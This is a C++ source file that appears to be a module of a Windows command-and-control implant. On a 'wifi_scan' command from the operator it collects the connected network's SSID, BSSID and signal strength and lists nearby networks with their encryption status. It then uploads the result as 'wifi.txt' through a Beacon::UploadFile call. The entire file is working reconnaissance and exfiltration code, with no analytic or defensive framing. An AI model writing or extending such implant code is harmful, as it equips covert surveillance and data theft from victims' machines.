#include "wifi_info.h"
#include "../config.h"
#include "../utils.h"
#include "../beacon.h"
#include <windows.h>
#include <wlanapi.h>
#pragma comment(lib, "wlanapi.lib")

namespace WifiInfo {
    void Scan() {
        HANDLE hClient = NULL;
        DWORD dwMaxClient = 2;
        DWORD dwCurVersion = 0;
        DWORD dwResult = WlanOpenHandle(dwMaxClient, NULL, &dwCurVersion, &hClient);
        if (dwResult != ERROR_SUCCESS) return;

        PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
        dwResult = WlanEnumInterfaces(hClient, NULL, &pIfList);
        if (dwResult != ERROR_SUCCESS) {
            WlanCloseHandle(hClient, NULL);
            return;
        }

        std::string result = "=== WIFI NETWORKS ===\n";

        for (DWORD i = 0; i < pIfList->dwNumberOfItems; i++) {
            PWLAN_INTERFACE_INFO pIfInfo = &pIfList->InterfaceInfo[i];

            PWLAN_CONNECTION_ATTRIBUTES pConnInfo = NULL;
            DWORD connSize = sizeof(WLAN_CONNECTION_ATTRIBUTES);
            WLAN_OPCODE_VALUE_TYPE opCode = wlan_opcode_value_type_query_only;

            dwResult = WlanQueryInterface(hClient, &pIfInfo->InterfaceGuid,
                wlan_intf_opcode_current_connection, NULL, &connSize,
                (PVOID*)&pConnInfo, &opCode);

            if (dwResult == ERROR_SUCCESS) {
                result += "Connected SSID: " + Utils::WStringToString(
                    std::wstring(pConnInfo->wlanAssociationAttributes.dot11Ssid.ucSSID,
                    pConnInfo->wlanAssociationAttributes.dot11Ssid.ucSSID +
                    pConnInfo->wlanAssociationAttributes.dot11Ssid.uSSIDLength)) + "\n";
                result += "BSSID: ";
                for (int j = 0; j < 6; j++) {
                    char buf[4];
                    sprintf_s(buf, "%02X:", pConnInfo->wlanAssociationAttributes.dot11Bssid[j]);
                    result += buf;
                }
                result += "\n";
                result += "Signal: " + std::to_string(
                    pConnInfo->wlanAssociationAttributes.wlanSignalQuality) + "%\n";

                WlanFreeMemory(pConnInfo);
            }

            PWLAN_AVAILABLE_NETWORK_LIST pNetList = NULL;
            dwResult = WlanGetAvailableNetworkList(hClient, &pIfInfo->InterfaceGuid,
                0x0001, NULL, &pNetList);

            if (dwResult == ERROR_SUCCESS) {
                for (DWORD j = 0; j < pNetList->dwNumberOfItems; j++) {
                    PWLAN_AVAILABLE_NETWORK pNet = &pNetList->Network[j];
                    result += "\nSSID: " + Utils::WStringToString(
                        std::wstring(pNet->dot11Ssid.ucSSID,
                        pNet->dot11Ssid.ucSSID + pNet->dot11Ssid.uSSIDLength)) + "\n";
                    result += "Signal: " + std::to_string(pNet->wlanSignalQuality) + "%\n";
                    result += "Flags: " + std::to_string(pNet->dwFlags) + "\n";
                    if (pNet->bSecurityEnabled) result += "Encrypted: Yes\n";
                    else result += "Encrypted: No\n";
                    result += "---\n";
                }
                WlanFreeMemory(pNetList);
            }
        }

        WlanFreeMemory(pIfList);
        WlanCloseHandle(hClient, NULL);

        if (!result.empty()) {
            Beacon::UploadFile("wifi_info", "wifi.txt",
                std::vector<BYTE>(result.begin(), result.end()));
        }
    }

    void OnCommand(const Beacon::Command& cmd) {
        if (cmd.type == "wifi_scan") Scan();
    }
}
